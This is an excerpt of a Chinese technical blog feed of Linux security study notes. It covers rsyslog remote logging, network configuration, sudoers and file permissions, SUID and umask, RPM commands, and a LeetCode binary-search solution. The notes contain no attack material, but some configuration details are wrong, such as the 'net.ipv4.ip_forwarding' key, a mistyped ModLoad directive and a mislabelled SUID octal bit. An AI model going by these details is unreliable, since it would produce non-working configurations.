        <content type="html"><![CDATA[<h2 id="日志服务器的搭建"><a href="#日志服务器的搭建" class="headerlink" title="日志服务器的搭建"></a>日志服务器的搭建</h2><h3 id="一、什么是日志"><a href="#一、什么是日志" class="headerlink" title="一、什么是日志"></a>一、什么是日志</h3><p>日志是记录系统活动信息的文件，默认系统运行产生的日志位于：/var/log。</p><p>一般记录什么时间、什么来源（IP）、什么用户、做了什么操作？</p><p>通过分析日志，有助于解决系统故障、查看非法行为等。</p><h3 id="二、日志的分类"><a href="#二、日志的分类" class="headerlink" title="二、日志的分类"></a>二、日志的分类</h3><p>1、系统服务日志：记录系统在运行中产生的事件变化（/var/log/messages）。</p><p>2、系统认证日志：何时何地谁尝试登陆系统，是否成功等（/var/log/secure）。</p><p>3、系统邮件服务日志：(/var/log/maillog)</p><p>4、系统定时任务日志：(/var/log/cron) </p><p>5、系统启动信息:（/var/log/boot.log）</p><h3 id="三、日志服务的配置文件"><a href="#三、日志服务的配置文件" class="headerlink" title="三、日志服务的配置文件"></a>三、日志服务的配置文件</h3><p>syslogd软件：/sbin/rsyslogd；syslog服务管理。</p><p>1、日志服务的配置文件：/etc/rsyslog.conf  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##MODULES####</span></span></span><br><span class="line">定义了UDP、TCP的日志监听模块</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##GLOBAL DIRECTIVES###</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ActionFileDeFaultTemplate***    定义了日志显示的格式</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IncludeConfig                根据路径导入配置文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##RULES###</span></span></span><br><span class="line">服务类型（连接符号）日志信息级别；（所有信息等级&gt;specify的日志信息写入右边的日志文件）</span><br><span class="line">*.info;    mail.none;    authpriv.none;    cron.none  /var/log/messages</span><br><span class="line">连接符号：</span><br><span class="line">.info 表示info等级以上</span><br><span class="line">.=info 表示info级别</span><br><span class="line">.!info 表示除了info级别，其他的所有级别</span><br></pre></td></tr></table></figure><p>2、日志级别</p><blockquote><p>1、debug    调试信息</p><p>2、info,        普通信息</p><p>3、notice,    提醒信息</p><p>4、warning, warn  (same  as  warning)    警告信息</p><p>5、err,error  (same  as  err),    错误信息</p><p>6、crit,     危机信息</p><p>7、alert,    警报信息</p><p>8、emerg, panic (same as     emerg)    紧急信息</p></blockquote><h3 id="四、日志备份——日志服务器的搭建"><a href="#四、日志备份——日志服务器的搭建" class="headerlink" title="四、日志备份——日志服务器的搭建"></a>四、日志备份——日志服务器的搭建</h3><blockquote><p>一旦服务器被入侵，日志文件被删除，依靠日志服务器中的备份日志，我们也可以对入侵行为进行分析。</p></blockquote><p>日志服务器分为客户端和服务端。</p><p>服务端：接受谁的日志？用什么协议和端口传输日志？存放在哪里？</p><p>客户端：发送什么级别什么服务的日志？用什么协议和端口传输日志？发给谁？</p><h4 id="日志服务器客户端的环境搭建"><a href="#日志服务器客户端的环境搭建" class="headerlink" title="日志服务器客户端的环境搭建"></a><strong>日志服务器客户端的环境搭建</strong></h4><p>1、客户端编辑日志配置文件/etc/rsyslog.conf写备份规则与服务器地址</p><blockquote><p>####begin forwarding rule####</p><p>#*.* @@remote-host：514</p><p>authpriv.*;    @@日志服务器IP：端口号   (@@TCP协议、@UDP协议)</p></blockquote><p>2、重启日志服务：<code>service rsyslog restart</code></p><h4 id="日志服务器服务端的环境搭建"><a href="#日志服务器服务端的环境搭建" class="headerlink" title="日志服务器服务端的环境搭建"></a><strong>日志服务器服务端的环境搭建</strong></h4><p>1、服务端编辑日志配置文件/etc/rsyslog.conf</p><blockquote><p><strong>####MODULES####</strong></p><p><strong>$ModLoad_imtcp（TCP协议）</strong></p><p><strong>$InputTCPServerRun 514（监听端口）</strong></p><p><strong>### end of the forwarding rule ###</strong></p><p>：属性    比较操作符    值        存放路径</p><p><strong>:fromhost-ip,isequal,”192.168.1.1”    /var/log/client/xiaozhi.log</strong></p><p>属性：fromhost，fromhost-ip，hostname</p><p>比较操作符：isequal startweith</p><p>值：匹配属性</p></blockquote><p>2、重启日志服务：<code>service rsyslog restart</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、Linux网络配置</title>
      <link href="/2020/07/20/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/4%E3%80%81Linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/07/20/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/4%E3%80%81Linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux网络配置"><a href="#Linux网络配置" class="headerlink" title="Linux网络配置"></a>Linux网络配置</h2><h3 id="一、Linux网络配置（大部分临时）"><a href="#一、Linux网络配置（大部分临时）" class="headerlink" title="一、Linux网络配置（大部分临时）"></a>一、Linux网络配置（大部分临时）</h3><p><u>1、查看网络配置状态信息</u>：<code>ip addr</code>； </p><blockquote><p>lo 回环测试地址， ehX有线网卡， wlpXX 无线网卡</p></blockquote><p><u>2、临时关闭NetworkManager服务</u>：<code>service NetworkManager stop</code></p><p>设置345level下关闭该服务：<code>chkconfig --level 345 NetworkManager off</code></p><blockquote><p>NetworkManager是Centos中一个帮助linux用户自动配置、管理网络的守护进程服务程序，桌面右上角的图形化网络管理工具就是它。</p><p>Linux的7个level运行级别</p><p>0    关机</p><p>1    单用户模式，root用户（windows 安全模式）</p><p>2    多用户，没有NFS（Network File System ）</p><p>3    完全的多用户模式（正常系统开机模式），控制台界面</p><p>4    没有用到，保留位</p><p>5    Xserver，GUI图形化界面（我目前看到的所有都是这个级别。。）</p><p>6    重启</p></blockquote><p><u>3、配置网络地址IP</u></p><p>配置网卡网络地址：<code>ip addr add  IP地址/子网掩码 dev 网卡名</code></p><p>删除网卡上的网络地址配置：<code>ip addr del IP地址/子网掩码 dev 网卡名</code></p><p><u>4、配置网关/路由</u></p><p>配置网卡的网关/默认路由：<code>ip route add default via 192.168.2.254  dev eth0</code></p><p>查看网卡的路由状态：<code>ip route</code></p><blockquote><p>在学习数通安全时，我们把路由器和计算机看做相同ISO层的设备，就是因为他们拥有相同的能力。因此计算机也可以看作路由器，具有路由功能，所以也可以配置路由，相当于电脑的网关。</p></blockquote><p><u>5、DNS服务器配置文件</u>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;resolv.conf在其中配置一条 nameserver 202.106.0.20（北京的DNS服务器）</span><br></pre></td></tr></table></figure><p><u>6、开启网卡：</u><code>ip link set eth0 up</code>/<code>ifdown 网卡</code>/<code>ifup 网卡</code></p><h3 id="二、Linux网络配置（配置文件方式永久）"><a href="#二、Linux网络配置（配置文件方式永久）" class="headerlink" title="二、Linux网络配置（配置文件方式永久）"></a>二、Linux网络配置（配置文件方式永久）</h3><p>配置文件：/etc/sysconfig/network-scripts/ifcfg-ethX</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DEVICE&#x3D;eth0            #网卡名</span><br><span class="line">TYPE&#x3D;Ethernet        #网络类型，以太网</span><br><span class="line">ONBOOT&#x3D;yes            #是否由network服务管理此配置文件</span><br><span class="line">BOOTPROTO&#x3D;static    #静态获取&#x2F;dhcp</span><br><span class="line">IPADDR&#x3D;192.168.2.183    #IP地址</span><br><span class="line">NETMASK&#x3D;255.255.255.0    #子网掩码</span><br><span class="line">#NM_CONTROLLED&#x3D;yes    #是否由NetworkManager服务管理此配置文件</span><br><span class="line">#HWADDR&#x3D;XXXXXXXXX    #MAC地址</span><br><span class="line">GATEWAY&#x3D;192.168.2.254    #网关地址</span><br><span class="line">DNS1&#x3D;114.114.114.114    #配置DNS地址</span><br><span class="line">DNS2&#x3D;XXX                #备用DNS地址</span><br></pre></td></tr></table></figure><h3 id="三、实验：使用Centos作为路由器连通两个网段的主机"><a href="#三、实验：使用Centos作为路由器连通两个网段的主机" class="headerlink" title="三、实验：使用Centos作为路由器连通两个网段的主机"></a>三、实验：使用Centos作为路由器连通两个网段的主机</h3><blockquote><p>1、Win7主机网络internet-01，IP：192.168.1.1， 网关:192.168.1.254</p><p>​    Centos作为路由器eth0位于internet-01，IP：192.168.1.254，eth1位于internet-02，IP：100.1.1.1</p><p>Windows2003作为服务器位于internet-02，IP：100.1.1.2，网关：100.1.1.1</p><p><strong>开启数据包转发功能：/etc/sysctl.conf    net.ipv4.ip_forwarding=1</strong></p><p>关闭防火墙，SElinux。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>33-搜索旋转排序数组</title>
      <link href="/2020/07/19/Leetcode/33%E3%80%81%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/"/>
      <url>/2020/07/19/Leetcode/33%E3%80%81%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="33、搜索旋转排序数组"><a href="#33、搜索旋转排序数组" class="headerlink" title="33、搜索旋转排序数组"></a>33、搜索旋转排序数组</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">https://leetcode-cn.com/problems/search-in-rotated-sorted-array/</a></p><p><a href="https://imgchr.com/i/UfAyod"><img src="https://s1.ax1x.com/2020/07/19/UfAyod.png" alt="UfAyod.png"></a></p><p>旋转排序数组，即将一个升序的数组一部分调转到一边。此题要求在一个旋转排序数组中寻找target的索引值，并且要求时间复杂度是O(logn)，很明显要进行二分法查询。此题与普通的二分法查询不同在于是旋转排序数组，但其实经过分析，得出旋转数组的特性：在一个旋转数组中，一个区间[i,j]，如果nums[i] &lt;= nums[j]，一定说明[i,j]是连续递增的。</p><p>因此，编码逻辑为：</p><p>初始l = 0， r = n - 1，mid = (l + r) / 2；</p><p>若 <code>target == nums[mid]</code>，直接返回</p><p>如果<code>nums[l] &lt;= nums[mid]</code> ，且<code>nums[l] &lt;= target &lt; nums[mid]</code>，则target就在此时的左半部分r=mid-1，否则target在右半部分l=mid+1。</p><p>如果<code>nums[mid]&lt;=nums[r]</code>，且<code>nums[mid] &lt; target &lt;= nums[right]</code>,则target就在此时的右半部分l=mid+1，否则target在左半部分r=mid-1。</p><blockquote><p>一个特别的二分查找，编码中的判断尽量减少类似mid-1的语句，一些特殊的输入案例会直接导致堆栈溢出。例如nums[mid-1] &gt;= target替换为nums[mid]&gt;target</p></blockquote><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>] == target ? <span class="number">0</span> : <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[l] &lt;= nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] &lt;= target &amp;&amp; nums[mid] &gt; target) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid] &lt; target &amp;&amp; nums[r] &gt;= target) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、Linux用户管理与权限相关</title>
      <link href="/2020/07/19/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/3%E3%80%81Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3/"/>
      <url>/2020/07/19/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/3%E3%80%81Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux用户管理与权限相关"><a href="#Linux用户管理与权限相关" class="headerlink" title="Linux用户管理与权限相关"></a>Linux用户管理与权限相关</h2><p>ACL相关介绍：<a href="https://www.ibm.com/developerworks/cn/linux/l-acl/">https://www.ibm.com/developerworks/cn/linux/l-acl/</a></p><h3 id="一、su、sudo与sudoers权限管理"><a href="#一、su、sudo与sudoers权限管理" class="headerlink" title="一、su、sudo与sudoers权限管理"></a>一、su、sudo与sudoers权限管理</h3><p><a href="http://linux.vbird.org/linux_basic/0410accountmanager.php#shadow_file">http://linux.vbird.org/linux_basic/0410accountmanager.php#shadow_file</a></p><p>1、普通用户</p><p>2、超级管理员 root</p><blockquote><p><strong>使用su进行用户切换时，加 - 和不加 - 是有很大区别的，加 - 是以切换的用户的login_shell登录，环境变量的资源都准确的是刚切换的用户的；而不加 - 只改变一小部分资源，大部分还是原来用户的。</strong></p><p><a href="https://imgchr.com/i/URunmT"><img src="https://s1.ax1x.com/2020/07/19/URunmT.png" alt="URunmT.png"></a></p></blockquote><p>su 和 sudo的区别？</p><blockquote><p><strong>su是switch user，如果是切换root，就需要使用超级管理员root的密码</strong></p><p><strong>sudo是暂时使用某用户的权限进行操作，一般使用超级管理员权限，但是只有在/etc/sudoers名单中的用户才能使用，使用时输入的的是当前用户的密码而非超级管理员密码。</strong></p><p><a href="https://imgchr.com/i/URMyef"><img src="https://s1.ax1x.com/2020/07/19/URMyef.png" alt="URMyef.png"></a></p></blockquote><p><strong>sudo的时间有效期</strong>：两次sudo命令5分钟以内就不用再次输入密码。</p><p><strong>/etc/sudoers的编辑方法</strong>：使用<code>visudo</code>命令编辑，如果有语法问题会报错。</p><p>/<strong>etc/sudoers设置权限的方法</strong>：</p><blockquote><p>账号/组名 | 主机名  | 可切换的身份  | 可下达的命令（绝对路径）</p><p><strong>用户</strong>： <code>user ALL=(ALL) ALL</code></p><p><strong>组</strong>：    <code>%group ALL=(ALL) ALL</code></p><p><strong>给用户设置某个指令的方法：</strong></p><p><code>user ALL=(ALL) !/usr/bin/passwd,!/usr/bin/passwd root,/usr/bin/passwd root </code>   #使用户只能帮忙修改密码，但是不能修改root的密码</p><p><strong>不需要密码使用sudo</strong>:<code>user ALL=(ALL) NOPASSWD: ALL</code></p><p>除了组可以统一规范多个用户的行为以外，还可以使用变量/别名的方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]# visudo  <span class="tag">&lt;<span class="name">==注意是</span> <span class="attr">root</span> 身份</span></span><br><span class="line"><span class="tag"><span class="attr">User_Alias</span> <span class="attr">ADMPW</span> = <span class="string">pro1,</span> <span class="attr">pro2</span>, <span class="attr">pro3</span>, <span class="attr">myuser1</span>, <span class="attr">myuser2</span></span></span><br><span class="line"><span class="tag"><span class="attr">Cmnd_Alias</span> <span class="attr">ADMPWCOM</span> = <span class="string">!/usr/bin/passwd,</span> /<span class="attr">usr</span>/<span class="attr">bin</span>/<span class="attr">passwd</span> [<span class="attr">A-Za-z</span>]*, !/<span class="attr">usr</span>/<span class="attr">bin</span>/<span class="attr">passwd</span> <span class="attr">root</span></span></span><br><span class="line"><span class="tag"><span class="attr">ADMPW</span>   <span class="attr">ALL</span>=<span class="string">(root)</span>  <span class="attr">ADMPWCOM</span></span></span><br></pre></td></tr></table></figure></blockquote><h3 id="二、-etc-shadow，-etc-passwd-etc-group文件分析"><a href="#二、-etc-shadow，-etc-passwd-etc-group文件分析" class="headerlink" title="二、/etc/shadow，/etc/passwd, /etc/group文件分析"></a>二、/etc/shadow，/etc/passwd, /etc/group文件分析</h3><p>用户名 | 密码密文 | 密码最近一次修改时间（1970.1.1起的相对天数）| 密码修改后多少天后才可以再修改 | 密码有效期 | 密码过期前提前几天进行警告 | 密码宽限时间（过期后登录会强制修改密码，过了宽限时间密码会失效，只能联系root进行操作）|  最终失效期（即使修改了密码也会失效，就是账户的寿命，比如可以用作收费授权）</p><p>SHA512加密，且使用了salt值一起加密，密码字段有三段$6$salt$密文，详情见鸟哥。</p><h3 id="三、用户管理相关操作命令"><a href="#三、用户管理相关操作命令" class="headerlink" title="三、用户管理相关操作命令"></a>三、用户管理相关操作命令</h3><blockquote><p><strong>Linux的用户是先有组后有用户，当创建用户没有指定基本组时，逻辑是先创建一个和用户名相同的组，然后该用户的基本组被默认设置为用户名相同的组。</strong></p><p><u><strong>用户创建管理等相关默认配置信息：/etc/login.defs</strong>，<strong>修改此文件可从根本打破linux的默认用户相关创建规则。</strong></u></p></blockquote><p><u>groupXXX</u>：</p><p><strong>增加组并指定组号</strong>：<code>groupadd -g 组号 组名</code></p><p><strong>修改组号</strong>：<code>groupmod -g 新组号 组名</code></p><p><strong>删除组：</strong><code>groupdel 组名</code></p><p><u>userXXX：</u></p><p><strong>增加用户并指定基本组和附加组：</strong><code>useradd -g 基本组 -G 附加组 新用户名</code></p><p><strong>添加用户并指定无家目录</strong>：<code>useradd -M 用户名</code></p><p><strong>添加用户并设置shell</strong>：<code>useradd -s shell程序（如/sbin/nologin）用户名</code></p><p><strong>设置用户的附加组与修改用户UID</strong>：<code>usermod -G 附加组号 -u UID号 用户名</code></p><p><strong>删除用户</strong>（连同家目录一起删除）：<code>userdel -r 用户名</code></p><p><u>passwd：</u></p><p><strong>设置用户密码：</strong><code>passwd 用户名</code>（密码四分之三原则，大小写、特殊字符、长度6位以上）</p><p><strong>将用户密码进行锁定，无法登录(在shadow密码前加了!!)：</strong><code>passwd -l(lock) 用户名</code></p><p><strong>将用户密码进行解锁</strong>：<code>passwd -u 用户名</code></p><p><strong>查看用户的passwd状态</strong>：<code>passwd -S 用户名</code></p><p><u>gpasswd：</u></p><p><strong>将用户从组中删除：</strong><code>gpasswd -d user 组</code></p><p><u>chage：</u></p><p><strong>设置用户密码有效期：</strong><code>chage -M 天数 用户名</code></p><p><strong>设置用户下次登录必须修改密码：</strong><code>chage -d 0 用户名</code></p><h3 id="四、Linux权限"><a href="#四、Linux权限" class="headerlink" title="四、Linux权限"></a>四、Linux权限</h3><p><strong>查看目录权限的命令</strong>：<code>ls -ld 目录名</code></p><blockquote><p>第一段是文件类型和权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件类型：d目录、-二进制、b块设备、c字符设备...</span><br><span class="line">权限三段rwx分别是主、组和其他用户的读r、写w、执行权限位x</span><br><span class="line">    r                w            x</span><br><span class="line">文件：可读取文件    可修改文件内容    可执行文件</span><br><span class="line">目录：可查看目录内容    可增删文件    可以进入目录</span><br></pre></td></tr></table></figure><p>第二段是如果是目录就表示目录中的子目录数；如果是文件就是节点/硬链接数(深入讲就是硬盘里该部分数据在文件系统中的关联节点数)</p><p>第三段是文件属主</p><p>第四段是文件属组</p><p>第五六七段是最新修改时间</p><p>第八段是文件名</p><p>第九段我称其为安全权限位：如果使用了ACL就是<code>+</code>，如果开启了selinux每一个文件这个位置都是  <code>.</code> ，表示有selinux相关的安全上下文，使用<code>getfacl 文件名</code>可以查看。</p></blockquote><p><strong>修改文件权限的命令</strong>：<code>chmod 用户 算术运算符 权限 文件</code></p><blockquote><p>用户：u(所属者) g(所属组) o(其他用户) a(所有人)</p><p>算术运算符：+ - =</p><p>权限：r、w、x、s(SGID/SUID)、t(SBIT)</p></blockquote><p><strong>修改文件的所属者</strong>：<code>chown 用户名 文件</code></p><p><strong>修改文件的所属组</strong>：<code>chgrp 组名 文件</code></p><h3 id="五、Linux特殊的权限"><a href="#五、Linux特殊的权限" class="headerlink" title="五、Linux特殊的权限"></a>五、Linux特殊的权限</h3><p><strong>1、粘滞位（Sticky Bit）/SBIT</strong>：粘滞位权限只能针对目录文件赋权，目录中创建的文件只有建立者可以删除。该权限位一般用于系统运行生成临时文件的目录，例如/tmp，以防止其它坏蛋删除临时文件，影响系统运行。<code>chmod o+t</code></p><blockquote><p>在使用8进制表示的权限中，1XXX就表示特殊权限粘滞位SBIT的赋权。</p><p>当权限位 t 是大写 T 时，说明此处无 x 权限。（SBIT占用x权限位）</p></blockquote><p><strong>2、SGID（Set-GID）</strong>：SGID权限只能针对目录文件赋权，在该目录下建立的文件所属组继承父目录的属组。</p><blockquote><p>在使用8进制表示的权限中，2XXX就表示特殊权限粘滞位SGID的赋权。</p><p>当权限位 s是大写 S 时，说明此处无 x 权限。（SGID占用x权限位）</p></blockquote><p><strong>3、SUID（Set-UID）</strong>：SUID权限只能针对文件赋权，一般针对可执行文件，在运行这个可执行文件后创建的进程的操作权限和文件属主相同/或者说进程的euid赋值为文件属主的uid。</p><p>​    可想而知，具有SUID的root属主可执行文件是很危险的，一旦对这种进程成功攻击，则会拿到root的权限，因此对于SUID进程，linux很多程序都有相关的保护措施，比如代码中常用的system函数，它的原理是通过/bin/sh -c command来执行命令的，在Ubuntu16.04/12.04中/bin/sh软链接指向/bin/dash，而dash就实现了一个保护机制，当它发现自己在一个Set-UID进程中运行时，会将有效用户IDeuid转变为真实用户IDruid，主动放弃特权，防止权限泄露。</p><blockquote><p>在使用8进制表示的权限中，4XXX就表示特殊权限粘滞位SGID的赋权。</p><p>当权限位 s是大写 S 时，说明此处无 x 权限。（SUID占用x权限位）</p></blockquote><p><strong>查找SUID程序的方法：</strong><code>find 文件夹 -perm 4XXX/2XXX/1XXX </code></p><h3 id="六、修改文件属性"><a href="#六、修改文件属性" class="headerlink" title="六、修改文件属性"></a>六、修改文件属性</h3><p><strong>增加文件不可变的属性</strong>：<code>chattr +i /etc/passwd /etc/shadow</code></p><p><strong>让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件：</strong><code>chattr +a /var/log/messages</code></p><p><strong>查看文件的属性:</strong><code>lsattr /etc/passwd /etc/shadow</code></p><h3 id="七、创建文件的默认权限"><a href="#七、创建文件的默认权限" class="headerlink" title="七、创建文件的默认权限"></a>七、创建文件的默认权限</h3><p>root和普通用户创建文件和目录的权限都不相同。</p><p>Linux认为目录的最高权限是0777、文件的最高权限是0666(因为不是所有文件都可以执行)</p><p>因此umask就是针对目录和文件的最高权限进行计算的。root的umask是0022；UID&gt;199且UID==GID的umask时002</p><p>一般推荐umask为027。</p><p><strong>修改umask的方法：</strong></p><p>1、临时修改：只需<code>umask 新的值</code></p><p>2、永久修改：/etc/profile（用户第一次登陆时执行） 在64行左右有一个对umask判断赋值的语句，判断是否UID大于199并且UID==GID，如果是，则umask002，否则umask022。可进行修改。/etc/bashrc （用户每次登录bash时执行），也要改。小心权限修改影响业务。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、安装Apache源码包与介绍RPM包</title>
      <link href="/2020/07/18/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/2%E3%80%81%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E3%80%81%E4%BB%8B%E7%BB%8DRPM%E5%8C%85%E3%80%81yum%E6%BA%90/"/>
      <url>/2020/07/18/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/2%E3%80%81%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E3%80%81%E4%BB%8B%E7%BB%8DRPM%E5%8C%85%E3%80%81yum%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="安装Apache源码包与介绍RPM包"><a href="#安装Apache源码包与介绍RPM包" class="headerlink" title="安装Apache源码包与介绍RPM包"></a>安装Apache源码包与介绍RPM包</h2><h3 id="一、Centos6安装Apache的步骤"><a href="#一、Centos6安装Apache的步骤" class="headerlink" title="一、Centos6安装Apache的步骤"></a>一、Centos6安装Apache的步骤</h3><p>1、将源码压缩包移动到/usr/src 或者 /usr/share下</p><p>2、查看INSTALL文档，编译安装三步骤：./configuration –prefix=安装目录（可缺省，缺省就是/usr/local/apache2）；make；make install</p><p>3、去源码路径的bin下apachectl start即可开启Apache的http服务（关闭就是stop）</p><p><strong>源码包Apache的主页</strong>：在安装路径中的htdocs文件夹中。</p><p><strong>修改Apache的端口号：</strong>1)源码包：$PREFIX/conf/http.conf 2)封装包：/etc/httpd/conf/http.conf; 然后重启</p><h3 id="二、端口相关命令"><a href="#二、端口相关命令" class="headerlink" title="二、端口相关命令"></a>二、端口相关命令</h3><p><code>ss -an</code>：比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息</p><p>干掉占用端口的进程:<code>netstat -tnlp | grep 80 ; kill PID</code></p><h3 id="三、不同Linux操作系统下的安装包"><a href="#三、不同Linux操作系统下的安装包" class="headerlink" title="三、不同Linux操作系统下的安装包"></a>三、不同Linux操作系统下的安装包</h3><p><strong>Debian</strong>: deb；<strong>Red Ha</strong>t: rpm,</p><p><strong>RPM包的命名格式</strong>：<code>名字 版本号 编辑次数 系统版本(EL6 == RED HAT6) 系统架构（noarch == 所有cpu架构可用）</code></p><p><strong>查看所有已安装的rpm包</strong>：<code>rpm -qa (query all)</code> </p><p><strong>查看rpm包安装的软件文件列表</strong>:<code>rpm -ql rpm包</code></p><p><strong>查看rpm包的详细信息</strong>：<code>rpm -qpi  rpm包(query package information)</code></p><p><strong>查看rpm的文件列表与安装路径</strong>：<code>rpm-qpl rpm包(list)</code></p><p><strong>安装rpm包</strong>：<code>rpm -ivh rpm包（install verify hash安装时列出标记）</code></p><p><strong>卸载rpm包安装的</strong>：<code>rpm -e 软件名</code>（软件之间会有依赖关系，需要按照依赖逐个rpm -e）</p><p><strong>yum软件安装的各种文件都在哪？</strong>：分布在各个地方，不在一个目录，比如配置文件在/etc,执行文件在/usr/bin,/usr/sbin/, 库文件在/usr/lib, 